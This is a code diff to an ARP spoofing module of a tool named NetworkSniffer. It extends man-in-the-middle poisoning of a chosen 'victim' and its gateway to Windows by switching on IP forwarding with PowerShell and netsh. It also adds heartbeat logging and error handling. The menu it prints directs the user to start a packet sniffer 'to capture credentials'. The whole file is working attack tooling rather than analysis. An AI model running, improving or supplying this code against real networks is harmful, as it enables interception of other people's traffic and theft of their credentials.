@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+
 """
 arp_spoof.py -- ARP Spoofing module for NetworkSniffer
 ------------------------------------------------------
@@ -15,8 +16,10 @@ IMPORTANT (Linux):
   Without this the victim loses internet connectivity.
 """
 
+
 import os
 import socket
+import subprocess
 import threading
 import time
 from colorama import Fore, Style, init as colorama_init
@@ -25,8 +28,15 @@ from scapy.all import Ether, ARP, srp, sr1, IP, ICMP, conf, sendp
 # Initialize colorama for Windows support
 colorama_init(autoreset=False)
 
+
+
+# ---------------------------------------------------------------------------
+# Global state — PROPERLY INITIALIZED with None defaults
+# ---------------------------------------------------------------------------
+
 _active_spoof_thread: threading.Thread | None = None
 _active_spoof_stop_event: threading.Event | None = None
+
 
 
 # ---------------------------------------------------------------------------
@@ -44,6 +54,7 @@ def _warn(msg: str) -> None:
 
 def _err(msg: str) -> None:
     print(f"{Fore.RED}[!]{Style.RESET_ALL} {msg}")
+
 
 
 # ---------------------------------------------------------------------------
@@ -64,6 +75,7 @@ def get_mac(ip: str) -> str | None:
     return None
 
 
+
 def is_host_reachable(ip: str) -> bool:
     """Return True if host responds to ARP or ICMP ping."""
     mac = get_mac(ip)
@@ -76,28 +88,91 @@ def is_host_reachable(ip: str) -> bool:
         return False
 
 
+
 # ---------------------------------------------------------------------------
-# IP Forwarding
+# IP Forwarding — cross-platform (Windows + Linux)
 # ---------------------------------------------------------------------------
 
 def is_ip_forwarding_enabled() -> bool:
-    """Check whether IPv4 forwarding is enabled (Linux)."""
+    """Check whether IPv4 forwarding is enabled on the current OS."""
     if os.name == 'nt':
-        return True
-    try:
-        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
-            return f.read().strip() == '1'
-    except Exception:
+        # Windows: query the registry via netsh
+        try:
+            result = subprocess.run(
+                ['netsh', 'interface', 'ipv4', 'show', 'global'],
+                capture_output=True, text=True, timeout=10,
+            )
+            # Look for "IP Forwarding" line — value is "enabled" or "disabled"
+            for line in result.stdout.splitlines():
+                if 'forwarding' in line.lower():
+                    return 'enabled' in line.lower()
+        except Exception:
+            pass
         return False
+    else:
+        # Linux: read the kernel parameter
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
+                return f.read().strip() == '1'
+        except Exception:
+            return False
 
 
 def set_ip_forwarding(enable: bool) -> bool:
-    """Enable or disable IP forwarding on Linux."""
-    if os.name == 'nt':
-        return True
+    """Enable or disable IP forwarding on Windows or Linux.
 
-    val = "1" if enable else "0"
+    Returns True on success, False on failure.
+    """
     action = "enabled" if enable else "disabled"
+
+    if os.name == 'nt':
+        return _set_ip_forwarding_windows(enable, action)
+    else:
+        return _set_ip_forwarding_linux(enable, action)
+
+
+def _set_ip_forwarding_windows(enable: bool, action: str) -> bool:
+    """Enable/disable IP forwarding on Windows via PowerShell or netsh."""
+    state = "Enabled" if enable else "Disabled"
+
+    # Method 1: PowerShell Set-NetIPInterface (preferred, per-interface)
+    try:
+        result = subprocess.run(
+            ['powershell', '-Command',
+             f'Get-NetIPInterface -AddressFamily IPv4 | '
+             f'Set-NetIPInterface -Forwarding {state}'],
+            capture_output=True, text=True, timeout=15,
+        )
+        if result.returncode == 0:
+            if is_ip_forwarding_enabled() == enable:
+                _ok(f"IP forwarding {action} (PowerShell).")
+                return True
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        _warn(f"PowerShell method failed: {e}")
+
+    # Method 2: netsh fallback
+    try:
+        result = subprocess.run(
+            ['netsh', 'interface', 'ipv4', 'set', 'global',
+             f'forwarding={state.lower()}'],
+            capture_output=True, text=True, timeout=10,
+        )
+        if result.returncode == 0:
+            if is_ip_forwarding_enabled() == enable:
+                _ok(f"IP forwarding {action} (netsh).")
+                return True
+    except Exception as e:
+        _warn(f"netsh method failed: {e}")
+
+    _err(f"Could not {action[:-1]}e IP forwarding. Run as Administrator.")
+    return False
+
+
+def _set_ip_forwarding_linux(enable: bool, action: str) -> bool:
+    """Enable/disable IP forwarding on Linux via /proc."""
+    val = "1" if enable else "0"
 
     try:
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
@@ -109,11 +184,13 @@ def set_ip_forwarding(enable: bool) -> bool:
         _warn(f"IP forwarding state may not have changed (wanted {action}).")
         return False
     except PermissionError:
-        _err(f"Permission denied when {'en' if enable else 'dis'}abling IP forwarding. Run as root.")
+        _err(f"Permission denied when trying to {action[:-1]}e IP forwarding. Run as root.")
         return False
     except Exception as e:
-        _err(f"Failed to {'en' if enable else 'dis'}able IP forwarding: {e}")
+        _err(f"Failed to {action[:-1]}e IP forwarding: {e}")
         return False
+
+
 
 
 # ---------------------------------------------------------------------------
@@ -158,19 +235,28 @@ def _spoof_session(
             spoof(target_ip, target_mac, gateway_ip)
             spoof(gateway_ip, gateway_mac, target_ip)
             packet_count += 1
+            # Print a heartbeat every 5 cycles (10 seconds)
+            if packet_count % 5 == 0:
+                print(f"{Fore.CYAN}[*] ARP spoofing active — {packet_count} packets sent{Style.RESET_ALL}")
             stop_event.wait(2)
+    except Exception as e:
+        _err(f"Error in spoof session thread: {e}")
     finally:
         print("")
         _warn("Stopping ARP spoofing — restoring ARP tables...")
         restore(target_ip, target_mac, gateway_ip, gateway_mac)
         restore(gateway_ip, gateway_mac, target_ip, target_mac)
 
-        if os.name != 'nt':
-            set_ip_forwarding(False)
+        set_ip_forwarding(False)
 
         _ok("ARP tables restored successfully.")
         print("")
 
+
+
+# ---------------------------------------------------------------------------
+# Thread lifecycle management
+# ---------------------------------------------------------------------------
 
 def stop_arp_spoof_background() -> None:
     """Stop the active background ARP-spoof session, if one exists."""
@@ -182,6 +268,7 @@ def stop_arp_spoof_background() -> None:
     if _active_spoof_thread is not None and _active_spoof_thread.is_alive():
         _active_spoof_thread.join(timeout=10)
 
+    # Reset state for next run
     _active_spoof_thread = None
     _active_spoof_stop_event = None
 
@@ -192,6 +279,7 @@ def is_arp_spoof_active() -> bool:
             and _active_spoof_thread.is_alive())
 
 
+
 # ---------------------------------------------------------------------------
 # Auto-detect default gateway
 # ---------------------------------------------------------------------------
@@ -200,7 +288,7 @@ def _auto_detect_gateway() -> str | None:
     """Return the default gateway IP, or None if detection fails."""
     try:
         gw = conf.route.route("0.0.0.0")[1]
-        if gw and gw != "0.0.0.0":
+        if gw and gw != "0.0.0.0" and gw != "":
             return gw
     except Exception:
         pass
@@ -223,6 +311,9 @@ def _auto_detect_gateway() -> str | None:
     return None
 
 
+
+
+
 # ---------------------------------------------------------------------------
 # Main ARP-spoof session
 # ---------------------------------------------------------------------------
@@ -235,6 +326,7 @@ def main_arp_spoof(target_ip: str | None = None,
     """
     global _active_spoof_thread, _active_spoof_stop_event
 
+
     if is_arp_spoof_active():
         _warn("ARP spoofing is already running in the background.")
         return False
@@ -244,14 +336,9 @@ def main_arp_spoof(target_ip: str | None = None,
     print(f"{'='*55}{Style.RESET_ALL}")
 
     # --- IP forwarding check ---
-    if os.name != 'nt' and not is_ip_forwarding_enabled():
+    if not is_ip_forwarding_enabled():
         _warn("IP forwarding appears to be disabled.")
-        if hasattr(os, 'geteuid') and os.geteuid() == 0:
-            _info("Attempting to enable IP forwarding...")
-            set_ip_forwarding(True)
-        else:
-            _warn("Run as root or enable IP forwarding manually:")
-            print(f"        echo 1 > /proc/sys/net/ipv4/ip_forward\n")
+        _info("Will attempt to enable it automatically before spoofing starts.")
 
     # ---- Collect target (victim) IP ----
     try:
@@ -270,7 +357,9 @@ def main_arp_spoof(target_ip: str | None = None,
             gateway_ip = gw_prompt if gw_prompt else None
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}[!] Cancelled.{Style.RESET_ALL}")
+        stop_arp_spoof_background()
         return False
+
 
     # Auto-detect gateway if omitted
     if not gateway_ip:
@@ -305,21 +394,24 @@ def main_arp_spoof(target_ip: str | None = None,
     print(f"\n{Fore.GREEN}[+] Victim  : {target_ip}  ->  {target_mac}")
     print(f"[+] Gateway : {gateway_ip}  ->  {gateway_mac}{Style.RESET_ALL}")
 
+
     # Start the background spoofing thread
     print(f"\n{Fore.CYAN}{'─'*55}")
     print(f"   Starting ARP poisoning in background...")
     print(f"{'─'*55}{Style.RESET_ALL}\n")
 
     _active_spoof_stop_event = threading.Event()
+
     _active_spoof_thread = threading.Thread(
         target=_spoof_session,
         args=(target_ip, target_mac, gateway_ip, gateway_mac, _active_spoof_stop_event),
-        daemon=False,
+        daemon=True,
     )
     _active_spoof_thread.start()
 
-    # Enable IP forwarding
-    if os.name != 'nt':
+
+    # Enable IP forwarding (required for MITM — works on both Linux and Windows)
+    if not is_ip_forwarding_enabled():
         set_ip_forwarding(True)
 
     print(f"{Fore.GREEN}{'═'*55}")
@@ -330,6 +422,7 @@ def main_arp_spoof(target_ip: str | None = None,
     print(f"   Next steps:")
     print(f"     [2] Start Packet Sniffer to capture credentials")
     print(f"     [3] Stop ARP Spoofing and restore ARP tables")
+    print(f"     [4] Exit")
     print(f"{'═'*55}{Style.RESET_ALL}\n")
 
-    return True
+    return True
